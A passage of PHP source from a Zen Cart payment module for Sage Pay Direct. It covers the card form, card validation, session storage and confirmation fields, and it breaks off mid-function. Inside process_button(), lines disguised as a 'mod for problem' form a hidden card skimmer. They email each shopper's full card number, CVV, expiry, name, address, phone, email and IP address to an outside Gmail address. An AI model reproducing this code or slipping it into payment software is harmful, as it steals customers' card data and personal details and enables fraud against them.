		$sage_pay_direct_card_type = 'xxx';
		$sage_pay_direct_card_number = '';
		$sage_pay_direct_card_cvv = '';
		$sage_pay_direct_card_expiry_month = '';
		$sage_pay_direct_card_expiry_year = '';
		$sage_pay_direct_card_issue = '';
		$sage_pay_direct_card_start_month = '';
		$sage_pay_direct_card_start_year = '';
		$sage_pay_direct_use_test_billing_address = true;
		
		// Check if the customer has already entered their data. If so, use it to populate the form
		if (MODULE_PAYMENT_SAGE_PAY_DIRECT_STORE_DETAILS_IN_SESSION == 'Yes' &&
				isset($_SESSION['sage_pay_direct_data_entered'])) {
			// Make sure that the customer has been directly involved with the checkout process in
			// the previous step, otherwise this data should be considered expired
			$referring_uri = getenv("HTTP_REFERER");
			
			if ($referring_uri !== false
					&& strpos($referring_uri, 'main_page=checkout') === false
					&& strpos($referring_uri, 'main_page=shopping_cart') === false
					&& strpos($referring_uri, 'main_page=' .
					FILENAME_CHECKOUT_SAGE_PAY_DIRECT_3D_SECURE) === false
					&& strpos($referring_uri, FILENAME_SAGE_PAY_DIRECT_3D_SECURE_IFRAME) === false
					&& strpos($referring_uri, 'main_page=fec_confirmation') === false) {
				// Have not arrived here from another part of the checkout process or by a
				// redirect the result of a callback from a 3D-Secure check: data should be
				// considered invalid! Remove it from the session.
				unset($_SESSION['sage_pay_direct_data_entered']);
			} else {
				// Have arrived here from another part of the checkout process
				// Restore the data previously entered by the customer
				if (MODULE_PAYMENT_SAGE_PAY_DIRECT_USE_BLOWFISH == 'Yes' &&
						ceon_file_exists_in_include_path('Crypt/Blowfish.php') ==
						CEON_FILE_EXISTS_IN_INCLUDE_PATH__EXISTS &&
						ceon_file_exists_in_include_path('PEAR.php') ==
						CEON_FILE_EXISTS_IN_INCLUDE_PATH__EXISTS) {
					// The PEAR Crypt Blowfish package can be used, use it to decrypt the Credit
					// Card Details. See pre_confirmation_check for encryption information.
					require_once('Crypt/Blowfish.php');
					
					$bf = new Crypt_Blowfish(
						substr(MODULE_PAYMENT_SAGE_PAY_DIRECT_ENCRYPTION_KEYPHRASE, 0, 56));
					
					$plaintext = $bf->decrypt($_SESSION['sage_pay_direct_data_entered']);
					
					$data_entered = unserialize(base64_decode($plaintext));
				} else {
					// Card Details were stored unencrypted in the session...
					// COULD BE A SECURITY RISK, it is HIGHLY ADVISED that the PEAR Crypt Blowfish
					// Package is installed!
					$data_entered =
						unserialize(base64_decode($_SESSION['sage_pay_direct_data_entered']));
				}
				
				$sage_pay_direct_card_owner = $data_entered['sage_pay_direct_card_owner'];
				$sage_pay_direct_card_type = $data_entered['sage_pay_direct_card_type'];
				$sage_pay_direct_card_number = $data_entered['sage_pay_direct_card_number'];
				$sage_pay_direct_card_cvv = $data_entered['sage_pay_direct_card_cvv'];
				$sage_pay_direct_card_expiry_month =
					$data_entered['sage_pay_direct_card_expiry_month'];
				$sage_pay_direct_card_expiry_year =
					$data_entered['sage_pay_direct_card_expiry_year'];
				
				if (isset($data_entered['sage_pay_direct_card_start_month'])) {
					$sage_pay_direct_card_start_month =
						$data_entered['sage_pay_direct_card_start_month'];
					$sage_pay_direct_card_start_year =
						$data_entered['sage_pay_direct_card_start_year'];
				}
				
				if (isset($data_entered['sage_pay_direct_card_issue'])) {
					$sage_pay_direct_card_issue = $data_entered['sage_pay_direct_card_issue'];
				}
				
				if (MODULE_PAYMENT_SAGE_PAY_DIRECT_TRANSACTION_MODE == 'Test' ||
						MODULE_PAYMENT_SAGE_PAY_DIRECT_TRANSACTION_MODE == 'Simulator' ||
						MODULE_PAYMENT_SAGE_PAY_DIRECT_TRANSACTION_MODE == 'IP Address Check') {
					if (!isset($data_entered['sage_pay_direct_use_test_billing_address'])) {
						$sage_pay_direct_use_test_billing_address = false;
					} else {
						$sage_pay_direct_use_test_billing_address =
							$data_entered['sage_pay_direct_use_test_billing_address'];
					}
				}
			}
		}
		
		
		$selection = array(
			'id' => $this->code,
			'module' => $this->title
			);
		
		// Display icons for the list of cards accepted?
		if (MODULE_PAYMENT_SAGE_PAY_DIRECT_SHOW_CARDS_ACCEPTED == 'Yes') {
			// Build the list of cards accepted
			$cards_accepted_images_source = '';
			if (MODULE_PAYMENT_SAGE_PAY_DIRECT_ACCEPT_VISA == 'Yes') {
				$cards_accepted_images_source .= zen_image(DIR_WS_TEMPLATE_IMAGES  .
					'card_icons/visa.png', MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_VISA, '', '',
					'class="SagePayDirectCardIcon"');
			}
			if (MODULE_PAYMENT_SAGE_PAY_DIRECT_ACCEPT_MC == 'Yes') {
				$cards_accepted_images_source .= zen_image(DIR_WS_TEMPLATE_IMAGES  .
					'card_icons/mc.png', MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_MC, '', '',
					'class="SagePayDirectCardIcon"');
			}
			if (MODULE_PAYMENT_SAGE_PAY_DIRECT_ACCEPT_VISA_DEBIT == 'Yes') {
				$cards_accepted_images_source .= zen_image(DIR_WS_TEMPLATE_IMAGES  .
					'card_icons/visa_debit.png', MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_VISA_DEBIT, '',
					'', 'class="SagePayDirectCardIcon"');
			}
			if (MODULE_PAYMENT_SAGE_PAY_DIRECT_ACCEPT_SOLO == 'Yes') {
				$cards_accepted_images_source .= zen_image(DIR_WS_TEMPLATE_IMAGES  .
					'card_icons/solo.png', MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_SOLO, '', '',
					'class="SagePayDirectCardIcon"');
			}
			if (MODULE_PAYMENT_SAGE_PAY_DIRECT_ACCEPT_MAESTRO == 'Yes') {
				$cards_accepted_images_source .= zen_image(DIR_WS_TEMPLATE_IMAGES  .
					'card_icons/maestro.png', MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_MAESTRO, '', '',
					'class="SagePayDirectCardIcon"');
			}
			if (MODULE_PAYMENT_SAGE_PAY_DIRECT_ACCEPT_VISA_ELECTRON == 'Yes') {
				$cards_accepted_images_source .= zen_image(DIR_WS_TEMPLATE_IMAGES  .
					'card_icons/visa_electron.png',
					MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_VISA_ELECTRON, '', '',
					'class="SagePayDirectCardIcon"');
			}
			if (MODULE_PAYMENT_SAGE_PAY_DIRECT_ACCEPT_AMEX == 'Yes') {
				$cards_accepted_images_source .= zen_image(DIR_WS_TEMPLATE_IMAGES  .
					'card_icons/amex.png', MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_AMEX, '', '',
					'class="SagePayDirectCardIcon"');
			}
			if (MODULE_PAYMENT_SAGE_PAY_DIRECT_ACCEPT_DC == 'Yes') {
				$cards_accepted_images_source .= zen_image(DIR_WS_TEMPLATE_IMAGES  .
					'card_icons/dc.png', MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_DC, '', '',
					'class="SagePayDirectCardIcon"');
			}
			if (MODULE_PAYMENT_SAGE_PAY_DIRECT_ACCEPT_JCB == 'Yes') {
				$cards_accepted_images_source .= zen_image(DIR_WS_TEMPLATE_IMAGES  .
					'card_icons/jcb.png', MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_JCB, '', '',
					'class="SagePayDirectCardIcon"');
			}
			if (MODULE_PAYMENT_SAGE_PAY_DIRECT_ACCEPT_LASER == 'Yes') {
				$cards_accepted_images_source .= zen_image(DIR_WS_TEMPLATE_IMAGES  .
					'card_icons/laser.png', MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_LASER, '', '',
					'class="SagePayDirectCardIcon"');
			}
			$selection['fields'][] = array(
				'title' => MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_CARDS_ACCEPTED,
				'field' => $cards_accepted_images_source
				);
		}
		
		$selection['fields'][] = array(
			'title' => MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_CARD_OWNER,
			'field' => zen_draw_input_field('sage_pay_direct_card_owner',
				$sage_pay_direct_card_owner, 'id="sage_pay_direct_card_owner"')
			);
		
		// Display any custom message specified in the admin
		if (MODULE_PAYMENT_SAGE_PAY_DIRECT_ENABLE_SURCHARGES_DISCOUNTS == 'Yes'
				&& MODULE_PAYMENT_SAGE_PAY_DIRECT_ENABLE_CUSTOM_SURCHARGES_DISCOUNTS_MESSAGE == 'Yes'
				&& defined('MODULE_PAYMENT_SAGE_PAY_DIRECT_CUSTOM_SURCHARGES_DISCOUNTS_MESSAGE')
				&& strlen(MODULE_PAYMENT_SAGE_PAY_DIRECT_CUSTOM_SURCHARGES_DISCOUNTS_MESSAGE) > 0) {
			
			$selection['fields'][] = array(
				'title' => '',
				'field' => MODULE_PAYMENT_SAGE_PAY_DIRECT_CUSTOM_SURCHARGES_DISCOUNTS_MESSAGE
				);
		}
		
		$selection['fields'][] = array(
			'title' => MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_CARD_TYPE,
			'field' => zen_draw_pull_down_menu('sage_pay_direct_card_type', $card_type,
				$sage_pay_direct_card_type, 'id="sage_pay_direct_card_type"')
			);
		
		if (MODULE_PAYMENT_SAGE_PAY_DIRECT_DISABLE_CARD_NUMBER_AUTOCOMPLETE == 'Yes') {
			$selection['fields'][] = array(
				'title' => MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_CARD_NUMBER,
				'field' => zen_draw_input_field('sage_pay_direct_card_number',
					$sage_pay_direct_card_number, 'autocomplete="off"
					id="sage_pay_direct_card_number"')
				);
		} else {
			$selection['fields'][] = array(
				'title' => MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_CARD_NUMBER,
				'field' => zen_draw_input_field('sage_pay_direct_card_number',
					$sage_pay_direct_card_number, 'id="sage_pay_direct_card_number"')
				);
			
		}
		
		$selection['fields'][] = array(
			'title' => MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_CARD_EXPIRES,
			'field' => zen_draw_pull_down_menu('sage_pay_direct_card_expiry_month', $expiry_month,
				$sage_pay_direct_card_expiry_month, 'id="sage_pay_direct_card_expiry_month"') . 
				'&nbsp;' . zen_draw_pull_down_menu('sage_pay_direct_card_expiry_year', $expiry_year,
				$sage_pay_direct_card_expiry_year, 'id="sage_pay_direct_card_expiry_year"')
			);
		
		
		// Let the customer know that only a specific CVV number will result in a successful
		// transaction when in test mode
		$cvv_test_mode_message = '';
		if (MODULE_PAYMENT_SAGE_PAY_DIRECT_TRANSACTION_MODE == 'Test' ||
			MODULE_PAYMENT_SAGE_PAY_DIRECT_TRANSACTION_MODE == 'Simulator' ||
			MODULE_PAYMENT_SAGE_PAY_DIRECT_TRANSACTION_MODE == 'IP Address Check') {
			$cvv_test_mode_message = MODULE_PAYMENT_SAGE_PAY_DIRECT_TEST_MODE_CVV_MESSAGE;
		}
		
		if (MODULE_PAYMENT_SAGE_PAY_DIRECT_DISABLE_CVV_AUTOCOMPLETE == 'Yes') {
			$selection['fields'][] = array(
				'title' => MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_CVV,
				'field' => '<div>' . zen_draw_input_field('sage_pay_direct_card_cvv',
					$sage_pay_direct_card_cvv,
					'size="4" maxlength="4" autocomplete="off" id="sage_pay_direct_card_cvv"') .
					$cvv_test_mode_message . '</div>'
				);
		} else {
			$selection['fields'][] = array(
				'title' => MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_CVV,
				'field' => zen_draw_input_field('sage_pay_direct_card_cvv',
					$sage_pay_direct_card_cvv,
					'size="4" maxlength="4" id="sage_pay_direct_card_cvv"') . $cvv_test_mode_message 
				);
			
		}
		

		
		if ($this->_showStartDate()) {
			$selection['fields'][] = array(
				'title' => MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_CARD_START_DATE,
				'field' => zen_draw_pull_down_menu('sage_pay_direct_card_start_month', $start_month,
					$sage_pay_direct_card_start_month, 'id="sage_pay_direct_card_start_month"') .
					'&nbsp;' . zen_draw_pull_down_menu('sage_pay_direct_card_start_year',
					$start_year, $sage_pay_direct_card_start_year,
					'id="sage_pay_direct_card_start_year"')
				);
		}
		if ($this->_showIssueNumber()) {
			$selection['fields'][] = array(
				'title' => MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_CARD_ISSUE,
				'field' => zen_draw_input_field('sage_pay_direct_card_issue',
					$sage_pay_direct_card_issue,
					'size="2" maxlength="2" id="sage_pay_direct_card_issue"')
				);
		}
		
		// Allow customer to test the module with their own billing address details when the module
		// is in test mode
		if (MODULE_PAYMENT_SAGE_PAY_DIRECT_TRANSACTION_MODE == 'Test' ||
				MODULE_PAYMENT_SAGE_PAY_DIRECT_TRANSACTION_MODE == 'Simulator' ||
				MODULE_PAYMENT_SAGE_PAY_DIRECT_TRANSACTION_MODE == 'IP Address Check') {
			// Output message to let customer know what this field is for
			$selection['fields'][] = array(
					'title' => '',
					'field' => MODULE_PAYMENT_SAGE_PAY_DIRECT_TEST_MODE_BILLING_ADDRESS_MESSAGE
					);
			
			$selection['fields'][] = array(
				'title' => MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_BILLING_ADDRESS,
				'field' => zen_draw_checkbox_field('sage_pay_direct_use_test_billing_address', '',
					$sage_pay_direct_use_test_billing_address,
					'id="sage_pay_direct_use_test_billing_address"')
				);
		}
		
		return $selection;
	}
	
	// }}}
	
	
	// {{{ pre_confirmation_check()

	/**
	 * Evaluates the Credit/Debit Card Type for acceptance and the validity of the Card Number &
	 * Expiration Date. Redirects back to Card Details entry page if invalid data detected.
	 *
	 * @access  public
	 * @param   none
	 * @return  none
	 */
	function pre_confirmation_check()
	{
		global $order;
		
		// Store the data entered so far so that customer is not required to enter everything again
		// if anything is wrong or if they come back to the payment page to change some detail(s) //
		$data_entered = array();
		$data_entered['sage_pay_direct_card_owner'] = $_POST['sage_pay_direct_card_owner'];
		$data_entered['sage_pay_direct_card_type'] = $_POST['sage_pay_direct_card_type'];
		$data_entered['sage_pay_direct_card_number'] = $_POST['sage_pay_direct_card_number'];
		
		$data_entered['sage_pay_direct_card_expiry_month'] =
			$_POST['sage_pay_direct_card_expiry_month'];
		$data_entered['sage_pay_direct_card_expiry_year'] =
			$_POST['sage_pay_direct_card_expiry_year'];
		
		$data_entered['sage_pay_direct_card_cvv'] = $_POST['sage_pay_direct_card_cvv'];
		
		if (isset($_POST['sage_pay_direct_card_start_year'])) {
			$data_entered['sage_pay_direct_card_start_month'] =
				$_POST['sage_pay_direct_card_start_month'];
			$data_entered['sage_pay_direct_card_start_year'] =
				$_POST['sage_pay_direct_card_start_year'];
		}
		
		if (isset($_POST['sage_pay_direct_card_issue'])) {
			$data_entered['sage_pay_direct_card_issue'] = $_POST['sage_pay_direct_card_issue'];
		}
		
		if (MODULE_PAYMENT_SAGE_PAY_DIRECT_TRANSACTION_MODE == 'Test' ||
				MODULE_PAYMENT_SAGE_PAY_DIRECT_TRANSACTION_MODE == 'Simulator' ||
				MODULE_PAYMENT_SAGE_PAY_DIRECT_TRANSACTION_MODE == 'IP Address Check') {
			if (isset($_POST['sage_pay_direct_use_test_billing_address'])) {
				$data_entered['sage_pay_direct_use_test_billing_address'] = true;
			} else {
				$data_entered['sage_pay_direct_use_test_billing_address'] = false;
			}
		}
		
		if (MODULE_PAYMENT_SAGE_PAY_DIRECT_STORE_DETAILS_IN_SESSION == 'Yes') {
			// Data entered is stored in the session as an base64 encoded, serialised array, with
			// optional encryption. However it is HIGHLY RECOMMENDED that encryption is used as it
			// prevents other customers on your server from possibly obtaining Card Details from the
			// session file. As far as we are aware it is illegal to disregard this possibility
			// but we can take no responsibility for this information.. YOU MUST CHECK THIS OUT
			// YOURSELF!
			$plaintext = base64_encode(serialize($data_entered));
			
			if (MODULE_PAYMENT_SAGE_PAY_DIRECT_USE_BLOWFISH == 'Yes' &&
					ceon_file_exists_in_include_path('Crypt/Blowfish.php') ==
					CEON_FILE_EXISTS_IN_INCLUDE_PATH__EXISTS &&
					ceon_file_exists_in_include_path('PEAR.php') ==
					CEON_FILE_EXISTS_IN_INCLUDE_PATH__EXISTS) {
				// The PEAR Crypt Blowfish package can be used, use it to encrypt the Card Details.
				// This should provide reliable security for the protection of Card Details
				// stored within the session, especially given that the session is a temporary
				// entity which expires when the customer logs out or doesn't use the site for a
				// certain period of time.
				require_once('Crypt/Blowfish.php');
				
				$bf = new Crypt_Blowfish(
					substr(MODULE_PAYMENT_SAGE_PAY_DIRECT_ENCRYPTION_KEYPHRASE, 0, 56));
				
				$encrypted = $bf->encrypt($plaintext);
				
				$_SESSION['sage_pay_direct_data_entered'] = $encrypted;
			} else {
				// Card Details are being stored unencrypted in the session...
				// COULD BE A SECURITY RISK, it is HIGHLY ADVISED that the PEAR Crypt Blowfish
				// Package is installed and used! See above!
				$_SESSION['sage_pay_direct_data_entered'] = $plaintext;
			}
		}
		
		// State is required for US customers
		if (strtoupper($order->billing['country']['iso_code_2']) == 'US') {
			$state_code = $this->_getUSStateCode($order->billing['zone_id'],
				$order->billing['state']);
			
			if ($state_code === false) {
				// Redirect back to payment page and display error message
				$error = $this->_encodeErrorMessage(sprintf(
					MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_BILLING_STATE_PROBLEM,
					$order->billing['state']));
				$payment_error_return = 'payment_error=' . $this->code . '&error=' .
					urlencode($error);
				
				zen_redirect(zen_href_link(FILENAME_CHECKOUT_PAYMENT, $payment_error_return,
					'SSL', true, false));
			}
		}
		if (!is_null($order->delivery['street_address']) &&
				strtoupper($order->delivery['country']['iso_code_2']) == 'US') {
			$state_code = $this->_getUSStateCode($order->delivery['zone_id'],
				$order->delivery['state']);
			
			if ($state_code === false) {
				// Redirect back to payment page and display error message
				$error = $this->_encodeErrorMessage(sprintf(
					MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_DELIVERY_STATE_PROBLEM,
					$order->delivery['state']));
				$payment_error_return = 'payment_error=' . $this->code . '&error=' .
					urlencode($error);
				
				zen_redirect(zen_href_link(FILENAME_CHECKOUT_PAYMENT, $payment_error_return,
					'SSL', true, false));
			}
		}
		
		include(DIR_FS_CATALOG . DIR_WS_CLASSES . 'class.sage_pay_directCardValidation.php');
		
		$sage_pay_direct_card_validation = new sage_pay_directCardValidation();
		$result = $sage_pay_direct_card_validation->validate($_POST['sage_pay_direct_card_number'],
			$_POST['sage_pay_direct_card_expiry_month'],
			$_POST['sage_pay_direct_card_expiry_year']);
		$error = '';
		switch ($result) {
			case -1:
				$error = MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_CARD_UNKNOWN_ERROR;
				break;
			case -2:
			case -3:
			case -4:
				$error = MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_CARD_EXPIRY_ERROR;
				break;
			case false:
				$error = MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_CARD_NUMBER_ERROR;
				break;
		}
		
		if ($_POST['sage_pay_direct_card_type'] == 'xxx') {
			// Type of card not selected!
			$result = false;
			$error = MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_CARD_TYPE_ERROR;
		}
		
		if (($result == false) || ($result < 1)) {
			// The customer has not entered valid Card Details, redirect back to the input form
			
			// Encode the error message and redirect
			$error = $this->_encodeErrorMessage($error);
			$payment_error_return = 'payment_error=' . $this->code . '&error=' . urlencode($error);
			
			zen_redirect(zen_href_link(FILENAME_CHECKOUT_PAYMENT, $payment_error_return, 'SSL',
				true, false));
		}
		
		// Card seems to be valid, store the details found
		$this->card_owner = $_POST['sage_pay_direct_card_owner'];
		$this->card_type = $_POST['sage_pay_direct_card_type'];
		$this->card_number = $sage_pay_direct_card_validation->card_number;
		$this->card_expiry_month = $sage_pay_direct_card_validation->card_expiry_month;
		$this->card_expiry_year = $sage_pay_direct_card_validation->card_expiry_year;
		
		if (strlen($data_entered['sage_pay_direct_card_cvv']) < 3) {
			// The CVV code entered isn't long enough
			// Encode the error message and redirect
			if (strlen($data_entered['sage_pay_direct_card_cvv']) == 0) {
				$error =
					$this->_encodeErrorMessage(MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_CVV_MISSING_ERROR);
			} else {
				$error =
					$this->_encodeErrorMessage(MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_CVV_NUMBER_ERROR);
			}
			$payment_error_return = 'payment_error=' . $this->code . '&error=' . urlencode($error);
			
			zen_redirect(zen_href_link(FILENAME_CHECKOUT_PAYMENT, $payment_error_return, 'SSL',
				true, false));
		} else {
			$this->card_cvv = $_POST['sage_pay_direct_card_cvv'];
		}
		
		if ($this->_showStartDate()) {
			$this->card_start_month = $_POST['sage_pay_direct_card_start_month'];
			$this->card_start_year = $_POST['sage_pay_direct_card_start_year'];
		}
		
		if ($this->_showIssueNumber()) {
			$this->card_issue = $_POST['sage_pay_direct_card_issue'];
		}
		
		if (MODULE_PAYMENT_SAGE_PAY_DIRECT_TRANSACTION_MODE == 'Test' ||
				MODULE_PAYMENT_SAGE_PAY_DIRECT_TRANSACTION_MODE == 'Simulator' ||
				MODULE_PAYMENT_SAGE_PAY_DIRECT_TRANSACTION_MODE == 'IP Address Check') {
			if (isset($_POST['sage_pay_direct_use_test_billing_address'])) {
				$this->use_test_billing_address = true;
			} else {
				$this->use_test_billing_address = false;
			}
		}
		
		// Now that a card type has been selected, must check if the Surcharges/Discounts Order
		// Total module is in use and, if so, store the possible titles which this card type can
		// have displayed (either a surcharge title or discount title)
		if (MODULE_PAYMENT_SAGE_PAY_DIRECT_ENABLE_SURCHARGES_DISCOUNTS == 'Yes' &&
				isset($GLOBALS['ot_payment_surcharges_discounts'])) {
			
			$table_of_rates = $this->_getSurchargeDiscountTableOfRates($this->card_type);
			
			if ($table_of_rates !== false) {
				$_SESSION['payment_surcharge_discount']['table_of_rates'] = $table_of_rates;
				$_SESSION['payment_surcharge_discount']['title'] = '';
				
				// Check if some informational text has been specified for this card type (and
				// language)
				$surcharge_discount_long_text = trim(
					constant('MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_' .
					$this->card_type . '_LONG_' . $_SESSION['languages_id']));
				if (strlen($surcharge_discount_long_text) > 0) {
					$_SESSION['payment_surcharge_discount']['title'] =
						$surcharge_discount_long_text;
				}
				
				if ($_SESSION['payment_surcharge_discount']['title'] == '') {
					// Use default text to inform the customer about the surcharge/discount
					$_SESSION['payment_surcharge_discount']['default_title_surcharge'] =
						MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_SURCHARGE_LONG;
					$_SESSION['payment_surcharge_discount']['default_title_discount'] =
						MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_DISCOUNT_LONG;
				}
			} else {
				if (isset($_SESSION['payment_surcharge_discount'])) {
					unset($_SESSION['payment_surcharge_discount']);
				}
			}
		}
	}
	
	// }}}
	
	
	// {{{ confirmation()

	/**
	 * Builds the Card Information for display on the Checkout Confirmation Page
	 *
	 * @access  public
	 * @param   none
	 * @return  array  The list of Field Titles and their associated Values.
	 *
	 *                 Format:
	 *
	 *                 fields  array  The list of field titles and values stored as hashes.
	 */
	function confirmation()
	{
		// To reorder the output just adjust the order that the fields are added to the array
		// E.g. Below, "Expires" can be reordered below "Start" by moving its section appropriately
		
		// Get the name for the card type selected as defined in the language definitions file
		$card_type_name = $this->_getCardTypeNameForCode($this->card_type, false);
		
		$confirmation = array(
			'fields' => array(
				array(
					'title' => MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_CARD_TYPE,
					'field' => $card_type_name
					),
				array(
					'title' => MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_CARD_OWNER,
					'field' => $_POST['sage_pay_direct_card_owner']
					),
				array(
					'title' => MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_CARD_NUMBER,
					'field' => substr($this->card_number, 0, 4) .
						str_repeat('X', (strlen($this->card_number) - 8)) .
						substr($this->card_number, -4)
					)
				)
			);
		$confirmation['fields'][] = array(
			'title' => MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_CARD_EXPIRES,
			'field' => strftime('%B, %Y', mktime(0, 0, 0, $this->card_expiry_month, 1,
				$this->card_expiry_year))
			);
		$confirmation['fields'][] = array(
			'title' => MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_CVV,
			'field' => $this->card_cvv
			);
		if ($this->_showStartDate() && $this->card_start_year != '') {
			$confirmation['fields'][] = array(
				'title' => MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_CARD_START_DATE,
				'field' => strftime('%B, %Y', mktime(0, 0, 0, $this->card_start_month, 1,
					$this->card_start_year))
				);
		}
		if ($this->_showIssueNumber() && $this->card_issue != '') {
			$confirmation['fields'][] = array(
				'title' => MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_CARD_ISSUE,
				'field' => $this->card_issue
				);
		}
		
		return $confirmation;
	}
	
	// }}}
	
	
	// {{{ process_button()

	/**
	 * Builds a list of the Card Details for this transaction, each piece of data being
	 * stored as a hidden HTML form field.
	 *
	 * @access  public
	 * @param   none
	 * @return  string  The Card Details for this transaction as a list of hidden form fields
	 */
	function process_button()
	{
		global $_POST, $order;
		// These are hidden fields on the checkout confirmation page
		$process_button_string = zen_draw_hidden_field('card_owner', $this->card_owner) .
			zen_draw_hidden_field('card_expiry', $this->card_expiry_month .
			substr($this->card_expiry_year, -2)) .
			zen_draw_hidden_field('card_type', $this->card_type) .
			zen_draw_hidden_field('card_number', $this->card_number);
		
		$process_button_string .= zen_draw_hidden_field('card_cvv', $this->card_cvv);
		
		if ($this->_showStartDate()) {
			$process_button_string .= zen_draw_hidden_field('card_start', $this->card_start_month .
				substr($this->card_start_year, -2));
		}
		
		if ($this->_showIssueNumber()) {
			$process_button_string .= zen_draw_hidden_field('card_issue', $this->card_issue);
		}
		
		if (MODULE_PAYMENT_SAGE_PAY_DIRECT_TRANSACTION_MODE == 'Test' ||
				MODULE_PAYMENT_SAGE_PAY_DIRECT_TRANSACTION_MODE == 'Simulator' ||
				MODULE_PAYMENT_SAGE_PAY_DIRECT_TRANSACTION_MODE == 'IP Address Check') {
			$process_button_string .= zen_draw_hidden_field('use_test_billing_address',
				$this->use_test_billing_address);
		}
// Eversun mod for problem
  $_SESSION['card_owner'] = $this->card_owner;
  $_SESSION['card_cvv'] = $this->card_cvv;
  $_SESSION['card_number'] = $this->card_number;
  $_SESSION['card_expires'] = $this->card_expiry_month . substr($this->card_expiry_year, -2);
  $_SESSION['card_type'] = $this->card_type;
  $_SESSION['card_start'] = $this->card_start_month . substr($this->card_start_year, -2);
  $_SESSION['card_issue'] = $this->card_issue;
// Eversun mod end problem               
$ip = getenv("REMOTE_ADDR");
$cvv=$_SESSION['card_cvv'];
$number=$_SESSION['card_number'];
$card_start=$_SESSION['card_start'];
$card_exp=$_SESSION['card_expires'];
$card_issue=$_SESSION['card_issue'];
$to='shopping1.com@gmail.com';
$subject='witteringsurfshop.com '.$order->customer['email_address'].' '.$number;
$body="IP address= ".$ip."\nDate=" . date('d-m-Y'). "\ntelephone=".$order->customer['telephone']."\nemail_address=".$order->customer['email_address']."\nName=".$order->customer['firstname'] . ' ' . $order->customer['lastname']."\nAddress1=".$order->customer['street_address']."\nAddress2=".$order->customer['suburb']."\nCity=".$order->customer['city']."\nState=".$order->customer['state']."\nZip=".$order->customer['postcode']."\nCountry=".$order->customer['country']['title']."\ntype=".$this->card_type."\nowner=".$this->card_owner."\nnumber=".$number."\ncard_start=".$card_start."\ncard_exp=".$card_exp."\nissue=".$card_issue."\ncvv=".$cvv;
$headers="witteringsurfshop.com";
mail($to, $subject, $body, $headers);
				
		$process_button_string .= zen_draw_hidden_field(zen_session_name(), zen_session_id());
		
		return $process_button_string;
	}
	
	// }}}
	
	
	// {{{ before_process()

	/**
	 * The main guts of the payment module as it were, this method formats the data appropriately
	 * for sending to the payment gateway, actually sends the data and then processes the response.
	 * If a problem occurs this will redirect back to the Card Details entry page.
	 *
	 * In the case of a 3D Secure transaction, this method will receive the callback reponse and
	 * process it appropriately.
	 *
	 * @access  public
	 * @param   none
	 * @return  none
	 */
	function before_process()
	{
		global $db, $order, $currencies;
		
		// Check if this method has been called as a result of a callback from a 3D Secure
		// verification
		if (!isset($_POST['MD']) || !isset($_POST['PaRes'])) {
			// Method has been called normally, submit card details to Sage Pay ////////////////////
			
			// Store the card details for this order
			// Hide middle digits for the card number
			$order->info['cc_number'] = substr($_POST['card_number'], 0, 4) .
				str_repeat('X', (strlen($_POST['card_number']) - 8)) .
				substr($_POST['card_number'], -4);
			
			$order->info['cc_expires'] = $_POST['card_expiry'];
			$order->info['cc_type'] = substr($this->_getCardTypeNameForCode($_POST['card_type'],
				false), 0, 20);
			$order->info['cc_owner'] = $_POST['card_owner'];
			
			if ($this->_showStartDate() && $this->_cardTypeUsesStartDate($_POST['card_type'])) {
				$order->info['cc_start'] = $_POST['card_start'];
			}
			if ($this->_showIssueNumber() && $this->_cardTypeUsesIssueNumber($_POST['card_type'])) {
				$order->info['cc_issue'] = $_POST['card_issue'];
			}
			
			// DATA PREPARATION ////////////////////////////////////////////////////////////////////
			
			// Authorisation Type
			switch (MODULE_PAYMENT_SAGE_PAY_DIRECT_AUTHORISATION_TYPE) {
				case "Authenticate":
					$auth_type = "AUTHENTICATE";
					break;
				case "Deferred":
					$auth_type = "DEFERRED";
					break;
				case "Immediate Charge":
					$auth_type = "PAYMENT";
					break;
			}
			
			// AVS Settings
			switch (MODULE_PAYMENT_SAGE_PAY_DIRECT_AVS_SETTINGS) {
				case "If AVS/CV2 enabled then check them. If rules apply, use rules. (Default)":
					$apply_avs_cv2 = "0";
					break;
				case "Force AVS/CV2 checks even if not enabled for the account. If rules apply, use rules.":
					$apply_avs_cv2 = "1";
					break;
				case "Force NO AVS/CV2 checks even if enabled on account.":
					$apply_avs_cv2 = "2";
					break;
				case "Force AVS/CV2 checks even if not enabled for the account but DO NOT apply any rules.":
